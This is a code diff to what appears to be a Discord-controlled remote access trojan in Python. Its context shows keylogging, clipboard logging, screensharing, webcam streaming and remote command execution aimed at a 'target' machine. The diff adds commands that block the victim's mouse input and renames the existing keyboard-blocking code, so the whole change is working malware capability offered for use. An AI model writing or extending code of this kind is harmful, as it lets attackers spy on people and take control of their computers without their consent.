@@ -3,6 +3,7 @@ import discord, io, aiohttp
 import numpy as np
 
 from pynput.keyboard import Listener
+from pynput import mouse
 from mss import mss
 from Clip_logging import Cliplogger
 from Key_logging import Keylogger
@@ -22,8 +23,10 @@ activeRecording = {}
 activeStreaming = {}
 activeCam = {}
 prefix = '.'
-blocked = False
-blocker = None
+blocked_keyboard = False
+blocker_keyboard = None
+blocked_cursor = False
+blocker_cursor = None
 
 def get_current_userAndMachine():
     user = os.getlogin()
@@ -197,7 +200,7 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
     if not cmd:
         return await ctx.send("enter a command you want to run")
     try:
-        if ctx.author.id != AUTHORID:
+        if ctx.author.id != 1434492547409117264:
             await ctx.send("cannot run command, only author")
             return
 
@@ -492,6 +495,8 @@ async def help(ctx: commands.Context):
         ".stopsharing :: stop screenshare\n"
         ".enablekey :: enable target's keyboard input\n"
         ".disablekey :: disable target's keyboard input\n"
+        ".enablemouse :: enable target's mouse input\n"
+        ".disablemouse :: disable target's mouse input\n"
         ".streamcam <url> :: stream camera from target and view it in browser\n"
         ".stopcam   :: stop webcam streaming\n"
         "\n"
@@ -621,11 +626,11 @@ async def stopcam(ctx: commands.Context):
 
 async def disable_keyboard(ctx: commands.Context):
     try:
-        global blocked, blocker
-        if not blocked:
-            blocker = Listener(suppress=True)
-            blocker.start()
-            blocked = True
+        global blocked_keyboard, blocker_keyboard
+        if not blocked_keyboard:
+            blocker_keyboard = Listener(suppress=True)
+            blocker_keyboard.start()
+            blocked_keyboard = True
             await ctx.send("disabled keyboard")
         else:
             await ctx.send("keyboard already disabled")
@@ -634,14 +639,40 @@ async def disable_keyboard(ctx: commands.Context):
 
 async def enable_keyboard(ctx: commands.Context):
     try:
-        global blocked, blocker
-        if blocked and blocker is not None:
-            blocker.stop()
-            blocker = None
-            blocked = False
+        global blocked_keyboard, blocker_keyboard
+        if blocked_keyboard and blocker_keyboard is not None:
+            blocker_keyboard.stop()
+            blocker_keyboard = None
+            blocked_keyboard = False
             await ctx.send("enabled keyboard")
         else:
             await ctx.send("keyboard is not disabled yet")
+    except Exception as e:
+        await ctx.send(f"{e}")
+
+async def disable_mouse(ctx: commands.Context):
+    try:
+        global blocked_cursor, blocker_cursor
+        if not blocked_cursor:
+            blocker_cursor = mouse.Listener(suppress=True)
+            blocker_cursor.start()
+            blocked_cursor = True
+            await ctx.send("disabled mouse")
+        else:
+            await ctx.send("mouse already disabled")
+    except Exception as e:
+        await ctx.send(f"{e}")
+
+async def enable_mouse(ctx: commands.Context):
+    try:
+        global blocked_cursor, blocker_cursor
+        if blocked_cursor and blocker_cursor is not None:
+            blocker_cursor.stop()
+            blocker_cursor = None
+            blocked_cursor = False
+            await ctx.send("enabled mouse")
+        else:
+            await ctx.send("mouse is not disabled yet")
     except Exception as e:
         await ctx.send(f"{e}")
 
@@ -817,6 +848,10 @@ async def on_message(message):
             await enable_keyboard(ctx)
         elif command == ".disablekey":
             await disable_keyboard(ctx)
+        elif command == ".enablemouse":
+            await enable_mouse(ctx)
+        elif command == ".disablemouse":
+            await disable_mouse(ctx)
         else:
             await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
